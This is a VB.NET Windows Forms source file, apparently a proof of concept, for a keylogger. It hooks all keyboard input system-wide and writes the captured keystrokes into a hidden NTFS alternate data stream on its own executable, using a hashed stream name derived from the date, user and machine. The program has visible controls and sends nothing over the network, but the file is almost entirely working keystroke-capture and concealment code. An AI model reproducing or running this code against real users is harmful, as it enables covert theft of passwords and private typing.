Public Class MainForm
    Private KeyboardHook As New KeyboardLowLevelHook(AddressOf Me.KeyboardCallback)
    Private NTFSADSID As String = String.Empty
    Private NTFSADSName As String = String.Empty
    Private NTFSADSWriteCache As New List(Of String)

    Private Sub MainForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            'Inizializzazioni
            Me.Icon = Util.GetApplicationIcon()
            Me.SetFormText()
            Me.SetStatusStripAppearance(Nothing)

            Me.NTFSADSID = Today.ToString("yyyyMMdd") & "." & System.Environment.UserName & "." & System.Environment.MachineName
            Me.NTFSADSName = ":" & Util.GetMD5HashFromString(Me.NTFSADSID) & ":$DATA"

            Me.UpdateListViewMain()
        Catch ex As Exception
            Me.SetStatusStripAppearance(ex)
        End Try
    End Sub

    Private Sub MainForm_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        If Me.tsbStartStop.Checked Then Me.tsbStartStop.PerformClick()
    End Sub

    Private Sub SetFormText()
        Me.Text = My.Application.Info.AssemblyName & " " &
            String.Format("{0}.{1}.{2}", My.Application.Info.Version.Major, My.Application.Info.Version.Minor, My.Application.Info.Version.Build) & " - " &
            My.Application.Info.Description
    End Sub

    Private Sub SetStatusStripAppearance(ex As System.Exception)
        If Me.tsbStartStop.Checked Then
            Me.tsbStartStop.ToolTipText = "Stop Keylog"
            Me.tsbStartStop.Image = Global.POC_NTFS_ADS.My.Resources.Resources.StatusStop_16x

            Me.tslMain.Text = "Keylog is active with saving to NTFS ADS '" & Me.NTFSADSName & "'."
        Else
            Me.tsbStartStop.ToolTipText = "Start Keylog"
            Me.tsbStartStop.Image = Global.POC_NTFS_ADS.My.Resources.Resources.StatusRun_16x

            Me.tslMain.Text = "Keylog is not active."
        End If

        If ex Is Nothing Then
            Me.tslMain.ToolTipText = String.Empty
            Me.tslMain.Image = Nothing
        Else
            Me.tslMain.Image = Global.POC_NTFS_ADS.My.Resources.Resources.StatusCriticalError_16x
            Me.tslMain.Text &= " [Error occurred]"
            Me.tslMain.ToolTipText = ex.Message
        End If
    End Sub

    Private Function KeyboardCallback(ByVal message As KeyboardLowLevelHook.KeyboardMessage, ByVal keyboardInputInfo As KeyboardLowLevelHook.KBDLLHOOKSTRUCT) As Boolean
        If message = KeyboardLowLevelHook.KeyboardMessage.WM_KEYDOWN OrElse
            message = KeyboardLowLevelHook.KeyboardMessage.WM_SYSKEYDOWN Then

            Try

                Dim keyLogText = String.Empty
                Select Case keyboardInputInfo.vkCode
                    Case Keys.Space
                        keyLogText = " "
                    Case Keys.Enter
                        keyLogText = ControlChars.NewLine
                    Case Else
                        If keyboardInputInfo.TestFlag(KeyboardLowLevelHook.KBDLLHOOKSTRUCT.LowLevelKeyboardFlags.LLKHF_ALTDOWN) Then
                            keyLogText = "[Alt]+"
                        End If

                        keyLogText &= keyboardInputInfo.vkCode.ToString
                End Select

                Me.txtKeyLog.Text &= keyLogText
                Me.txtKeyLog.SelectionStart = Me.txtKeyLog.Text.Length
                Me.txtKeyLog.ScrollToCaret()
                Me.txtKeyLog.SelectionStart = Me.txtKeyLog.Text.Length - keyLogText.Length
                Me.txtKeyLog.SelectionLength = keyLogText.Length

                SyncLock Me.NTFSADSWriteCache
                    Me.NTFSADSWriteCache.Add(keyLogText)
                End SyncLock

                Me.SetStatusStripAppearance(Nothing)
            Catch ex As Exception
                Me.SetStatusStripAppearance(ex)
            End Try
        End If

        Return False
    End Function


#Region "Gestione TimerMain per scrittura NTDS ADS"
    Private Sub tmsMain_Tick(sender As Object, e As EventArgs) Handles tmrMain.Tick
        Try
            Me.WriteNTFSADS()
            Me.UpdateListViewMain()
            Me.SetStatusStripAppearance(Nothing)
        Catch ex As Exception
            Me.SetStatusStripAppearance(ex)
        End Try
    End Sub

    Private Sub WriteNTFSADS()

        SyncLock Me.NTFSADSWriteCache
            If Me.NTFSADSWriteCache.Count > 0 Then
                Dim streamPath = UtilNTFSADS.GetExecutableNTFSADSPath(Me.NTFSADSName)

                Dim fileExists = System.IO.File.Exists(streamPath)

                Using textWriter As System.IO.StreamWriter = System.IO.File.AppendText(streamPath)

                    If Not fileExists Then
                        textWriter.WriteLine(Me.NTFSADSID)
                    End If

                    For Each s As String In Me.NTFSADSWriteCache
                        textWriter.Write(s)
                    Next

                    textWriter.Flush()
                    textWriter.Close()

                    Me.NTFSADSWriteCache.Clear()

                End Using
            End If
        End SyncLock

    End Sub
#End Region

#Region "Gestione ListViewMain"
    Private Sub lsvMain_SelectedIndexChanged(sender As Object, e As EventArgs) Handles lsvMain.SelectedIndexChanged
        Me.tsbOpen.Enabled = Me.lsvMain.SelectedItems.Count = 1
        Me.tsbDelete.Enabled = Me.lsvMain.SelectedItems.Count = 1
    End Sub

    Private Sub lsvMain_DoubleClick(sender As Object, e As EventArgs) Handles lsvMain.DoubleClick
        If Me.lsvMain.SelectedItems.Count = 1 Then Me.tsbOpen.PerformClick()
    End Sub

    Private Sub UpdateListViewMain()
        Dim streams = UtilNTFSADS.GetAlternateDataStreams(Application.ExecutablePath())

        For Each s As String In streams
            If Not Me.lsvMain.Items.ContainsKey(s) Then
                Me.lsvMain.Items.Add(s, s, -1)
            End If
        Next
    End Sub

#End Region

#Region "Gestione ToolStripButton"
    Private Sub tsbStartStop_Click(sender As Object, e As EventArgs) Handles tsbStartStop.Click
        Try
            If Me.tsbStartStop.Checked Then
                Me.KeyboardHook.SetHook()
            Else
                Me.KeyboardHook.Unhook()
                Me.tmrMain.Start()
            End If

            Me.tmrMain.Enabled = Me.tsbStartStop.Checked

            Me.SetStatusStripAppearance(Nothing)
        Catch ex As Exception
            Me.SetStatusStripAppearance(ex)
        End Try
    End Sub
    Private Sub tsbClear_Click(sender As Object, e As EventArgs) Handles tsbClear.Click
        Me.txtKeyLog.Clear()
    End Sub

    Private Sub tsbOpen_Click(sender As Object, e As EventArgs) Handles tsbOpen.Click
        Try
            Using p As System.Diagnostics.Process = New System.Diagnostics.Process()
                p.StartInfo.FileName = "notepad.exe"
                p.StartInfo.Arguments = Application.ExecutablePath() & Me.lsvMain.SelectedItems(0).Text
                p.Start()
            End Using
        Catch ex As Exception
            Me.SetStatusStripAppearance(ex)
        End Try
    End Sub

    Private Sub tsbDelete_Click(sender As Object, e As EventArgs) Handles tsbDelete.Click
        Try
            If Util.ShowQuestion("confirm deletion of the selected stream?") = DialogResult.Yes Then
                System.IO.File.Delete(UtilNTFSADS.GetExecutableNTFSADSPath(Me.lsvMain.SelectedItems(0).Text))
                Me.lsvMain.Items.Clear()
                Me.UpdateListViewMain()
            End If
        Catch ex As Exception
            Me.SetStatusStripAppearance(ex)
        End Try
    End Sub



#End Region
End Class
